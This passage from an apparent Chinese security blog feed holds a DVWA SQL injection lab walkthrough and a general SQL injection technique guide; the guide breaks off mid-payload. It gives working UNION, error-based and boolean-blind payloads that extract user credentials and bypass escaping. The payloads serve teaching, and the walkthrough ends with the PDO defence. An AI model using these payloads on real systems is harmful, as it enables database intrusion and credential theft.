&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之SQL Injection</title>
    <link href="http://wlfsky.com/2018/01/17/DVWA%E4%B9%8BSQL-Injection/"/>
    <id>http://wlfsky.com/2018/01/17/DVWA之SQL-Injection/</id>
    <published>2018-01-17T12:20:22.000Z</published>
    <updated>2018-01-19T07:32:24.171Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文参考自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p><h3 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a><strong>手工注入思路</strong></h3><p>自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。</p><blockquote><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>2.猜解SQL查询语句中的字段数</p><p>3.确定显示的字段顺序</p><p>4.获取当前数据库</p><p>5.获取数据库中的表</p><p>6.获取表中的字段名</p><p>7.获取数据</p></blockquote><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p><h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，查询成功：</p><p><img src="/img/dvwa-sql-2.png" alt="dvwa-sql-2.png"></p><p>输入1’ and ‘1’ = ‘2，查询失败，返回结果为空：</p><p><img src="/img/dvwa-sql-3.png" alt="dvwa-sql-3.png"></p><p>输入1’ or ‘1’ = ‘1，查询成功：</p><p><img src="/img/dvwa-sql-4.png" alt="dvwa-sql-4.png"></p><p>返回了多个结果，说明存在字符型注入。</p><h3 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>输入1′  order by 1 #，查询成功：</p><p><img src="/img/dvwa-sql-5.png" alt="dvwa-sql-5.png"></p><p>输入1′ order by 2 #，查询成功：</p><p><img src="/img/dvwa-sql-6.png" alt="dvwa-sql-6.png"></p><p>输入1′ order by 3 #，查询失败：</p><p><img src="/img/dvwa-sql-7.png" alt="dvwa-sql-7.png"></p><p>说明执行的SQL查询语句中只有两个字段。</p><p>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p><h3 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h3><p>输入1′ union select 1,2 #，查询成功：</p><p><img src="/img/dvwa-sql-8.png" alt="dvwa-sql-8.png"></p><p>确定了显示的字段顺序。</p><p>（这里如果不显示select后面的数据，则使前面的id取逻辑错误值-1或者0）</p><h3 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>输入1′ union select 1,database() #，查询成功：</p><p><img src="/img/dvwa-sql-9.png" alt="dvwa-sql-9.png"></p><p>说明当前的数据库为dvwa。</p><h3 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h3><p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p><img src="/img/dvwa-sql-10.png" alt="dvwa-sql-10.png"></p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：</p><p><img src="/img/dvwa-sql-11.png" alt="dvwa-sql-11.png"></p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user, password,avatar,last_login,failed_login。</p><h3 id="7-获取数据"><a href="#7-获取数据" class="headerlink" title="7.获取数据"></a>7.获取数据</h3><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name,user), group_concat(password) from users #，查询成功：</p><p><img src="/img/dvwa-sql-12.png" alt="dvwa-sql-12.png"></p><p>这样就得到了users表中所有用户的user_id,first_name,last_name,user, password的数据。</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p><img src="/img/dvwa-sql-13.png" alt="dvwa-sql-13.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>前端使用了下拉选择菜单，我们可以通过抓包改参数，提交恶意构造的查询参数；也可以直接F12修改参数。</p><h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>F12更改参数id为1′ or 1=1 #</p><p><img src="/img/dvwa-sql-14.png" alt="dvwa-sql-14.png"></p><p>报错：</p><p><img src="/img/dvwa-sql-15.png" alt="dvwa-sql-15.png"></p><p>F12更改参数id为1 or 1=1 #，查询成功：</p><p><img src="/img/dvwa-sql-16.png" alt="dvwa-sql-16.png"></p><p>说明存在数字型注入。</p><p>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）</p><h3 id="2-猜解SQL查询语句中的字段数-1"><a href="#2-猜解SQL查询语句中的字段数-1" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>更改参数id为1 order by 2 #，查询成功：</p><p><img src="/img/dvwa-sql-17.png" alt="dvwa-sql-17.png"></p><p>更改参数id为1 order by 3 #，报错：</p><p><img src="/img/dvwa-sql-18.png" alt="dvwa-sql-18.png"></p><p>说明执行的SQL查询语句中只有两个字段。</p><h3 id="3-确定显示的字段顺序-1"><a href="#3-确定显示的字段顺序-1" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h3><p>更改参数id为1 union select 1,2 #，查询成功：</p><p><img src="/img/dvwa-sql-19.png" alt="dvwa-sql-19.png"></p><p>确定了显示的字段顺序。</p><h3 id="4-获取当前数据库-1"><a href="#4-获取当前数据库-1" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>更改参数id为1 union select 1,database() #，查询成功：</p><p><img src="/img/dvwa-sql-20.png" alt="dvwa-sql-20.png"></p><p>说明当前的数据库为dvwa。</p><h3 id="5-获取数据库中的表-1"><a href="#5-获取数据库中的表-1" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h3><p>更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p><img src="/img/dvwa-sql-21.png" alt="dvwa-sql-21.png"></p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><h3 id="6-获取表中的字段名-1"><a href="#6-获取表中的字段名-1" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p><p><img src="/img/dvwa-sql-22.png" alt="dvwa-sql-22.png"></p><p>这是因为单引号被转义了，变成了\’。</p><p>可以利用hex() 和unhex()编码解码进行绕过，更改参数id为1 union select 1, group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p><p><img src="/img/dvwa-sql-23.png" alt="dvwa-sql-23.png"></p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user, password,avatar,last_login,failed_login。</p><h3 id="7-获取数据-1"><a href="#7-获取数据-1" class="headerlink" title="7.获取数据"></a>7.获取数据</h3><p>修改参数id为1 or 1=1 union select group_concat(user_id,first_name, last_name,user),group_concat(password) from users #，查询成功：</p><p><img src="/img/dvwa-sql-24.png" alt="dvwa-sql-24.png"></p><p>这样就得到了users表中所有用户的user_id,first_name,last_name,user, password的数据。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1以及一些小变动，希望以此控制只输出一个结果。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，所以直接演示最后一步获取数据。</p><p>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name), group_concat(password) from users #，查询成功：</p><p><img src="/img/dvwa-sql-25.png" alt="dvwa-sql-25.png"></p><p>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><p><img src="/img/dvwa-sql-26.png" alt="dvwa-sql-26.png"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Get values </span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入技术</title>
    <link href="http://wlfsky.com/2018/01/15/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"/>
    <id>http://wlfsky.com/2018/01/15/SQL注入技术/</id>
    <published>2018-01-15T05:05:33.000Z</published>
    <updated>2018-01-20T15:56:53.747Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><h4 id="SQL注入基本介绍"><a href="#SQL注入基本介绍" class="headerlink" title="SQL注入基本介绍"></a>SQL注入基本介绍</h4><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p><p>SQL注入是一种常见的WEB安全漏洞，攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><h4 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h4><p>针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p><ol><li><p>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</p></li><li><p>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</p></li></ol><h3 id="SQL注入攻击方式"><a href="#SQL注入攻击方式" class="headerlink" title="SQL注入攻击方式"></a>SQL注入攻击方式</h3><p>SQL注入的攻击方式分为以下五种：</p><ol><li>Error-based SQL injection（报错型注入又称错误回显注入）</li><li>UNION query SQL injection（可联合查询注入）</li><li>Stacked queries SQL injection（可多语句查询注入）</li><li>Boolean-based blind SQL injection（布尔型注入）</li><li>Time-based blind SQL injection（基于时间延迟注入）</li></ol><h3 id="如何进行SQL注入攻击"><a href="#如何进行SQL注入攻击" class="headerlink" title="如何进行SQL注入攻击"></a>如何进行SQL注入攻击</h3><h4 id="SQL注入攻击中常用的一些参数"><a href="#SQL注入攻击中常用的一些参数" class="headerlink" title="SQL注入攻击中常用的一些参数"></a>SQL注入攻击中常用的一些参数</h4><blockquote><p>user(): 当前数据库的用户<br>database(): 当前使用的数据库<br>version(): 当前使用的数据库的版本<br>@@datadir: 数据库路径<br>@@basedir: 获取安装路径<br>concat()和concat_ws(): 联合数据<br>group_concat(): 多条数据连接<br>hex()和unhex(): 对数据进行hex编码解码<br>load_file(): 这是MYSQL以文本方式读取文件的参数</p></blockquote><h4 id="SQL注入攻击的步骤"><a href="#SQL注入攻击的步骤" class="headerlink" title="SQL注入攻击的步骤"></a>SQL注入攻击的步骤</h4><h5 id="Error-based-SQL-injection"><a href="#Error-based-SQL-injection" class="headerlink" title="Error-based SQL injection"></a>Error-based SQL injection</h5><ul><li>逻辑错误部分，也就是将GET变量取值变为逻辑错误值，如：id = -1</li><li>固定SQL联合查询语句<ul><li>union select 1 from (select count(*),concat(floor(rand(0)*2),(注入暴数据语句))a from information_schema.tables group by a)b#</li></ul></li><li>注释语句，将整个语句后面的部分注释掉<ul><li>利用/* 和 – - 还有 %23 以及 # 来注释</li></ul></li><li>注入暴数据语句<ul><li>基本格式为select XX from YY limit 0,1</li><li>只能暴单条数据，所以根据limit来暴</li></ul></li></ul><h5 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h5><ul><li>判断是否存在注入，注入是字符型还是数字型<ul><li>利用单引号，and 1=1，and 1=2，双引号，反斜杠和注释等判断</li></ul></li><li>猜解SQL查询语句中的字段数<ul><li>利用order by 或者 union select 1,2,3…来猜解字段数</li><li>使用union语句时，将变量取值变为逻辑错误值，如：id=-1</li></ul></li><li>获取当前数据库<ul><li>利用database()来得知当前数据库，利用user()得知当前数据库连接使用的用户，利用version()得知当前数据库的版本</li></ul></li><li>获取数据库中的表名<ul><li>union select group_concat(table_name) from information_schema.tables where table_schema = database() #</li></ul></li><li>获取表中的字段名<ul><li>union select group_concat(column_name) from information_schema.columns where table_name = ‘表名’</li><li>如果单引号被转义，则使用hex()转义绕过</li></ul></li><li>获得数据<ul><li>union select group_concat(字段名) from 表名</li></ul></li></ul><h5 id="Boolean-based-blind-SQL-injection"><a href="#Boolean-based-blind-SQL-injection" class="headerlink" title="Boolean-based blind SQL injection"></a>Boolean-based blind SQL injection</h5><ul><li>判断是否存在注入，注入是字符型还是数据型<ul><li>输入1’ and 1=1 # 显示存在</li><li>输入1’ and 1=2 # 显示不存在，则说明存在字符型的SQL盲注</li></ul></li><li>猜解当前数据库名<ul><li>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符</li><li>输入1’ and length(database())=1 # 显示不存在</li><li>输入1’ and length(database())=2 # 显示不存在，最终得出长度</li><li>然后采用<strong>二分法</strong>猜解数据库名</li><li>substr(string,start,length)</li><li>输入1’ and ascii(substr(database(),1,1))&gt;97 # 显示存在，说明数据库名第一个字符的ascii值大于97</li><li>输入1’ and ascii(substr(database(),1,1))&lt;122 # 显示存在，说明数据库名第一个字符的ascii值小于122</li><li>改变数字重复上述步骤可猜解出数据库名</li></ul></li></ul><ul><li><p>猜解数据库中的表名</p><ul><li>首先猜解数据库中表的数量</li><li>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</li><li>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=2 # 显示存在，则说明数据库中共有两个表</li><li>然后猜解表名长度</li><li>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 =2…最终得到表名长度</li><li>最后猜解表名</li><li>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在 &lt; 122 最终得到第一个字符，然后2,1…</li></ul></li><li><p>猜解表中的字段名</p><ul><li>首先猜解表中字段的数量</li><li>1’ and (select count (column_name) from information_schema.columns where table_name=’表名’)=1 # 显示不存在</li><li>1’ and (select count (column_name) from information_schema.columns where table_name=’表名’)=2 # 显示存在，则说明表中有2个字段</li><li>然后猜解字段长度</li><li>1’ and length(substr((select column_name from information_schema.columns where table_name=’表名’ limit 0,1),1))=1 # 显示不存在 =2…最终得到字段长度</li><li>最后猜解字段名</li><li>1’ and ascii(substr((select column_name from information_schema.columns where table_name=’表名’ limit 0,1),1,1))&gt;97 # 显示存在，然后采用二分法最终得到字段名</li></ul></li><li><p>猜解数据</p><ul><li>猜解数据长度</li><li>1’ and length(substr((select 字段名 from 表名 limit 0,1),1))=1 # 显示不存在，然后增加等号后面的数字，最终得到数据长度</li><li>最后猜解数据</li><li>1’ and ascii(substr((select 字段名 